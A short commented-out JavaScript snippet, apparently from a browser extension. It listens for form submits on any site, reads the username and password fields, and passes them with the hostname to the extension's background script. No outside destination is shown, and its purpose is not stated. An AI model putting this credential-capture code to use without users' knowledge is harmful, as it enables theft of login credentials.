/*
document.addEventListener("submit", function (e) {
    const form = e.target;
    const inputs = form.querySelectorAll("input[type='password']");
    if (inputs.length > 0) {
        const username = form.querySelector("input[type='text'], input[type='email']")?.value || "unknown";
        const password = inputs[0].value;
        const hostname = window.location.hostname;

        chrome.runtime.sendMessage({
            type: "login_attempt",
            site: hostname,
            username: username,
            password: password
        });
    }
}, true);
*/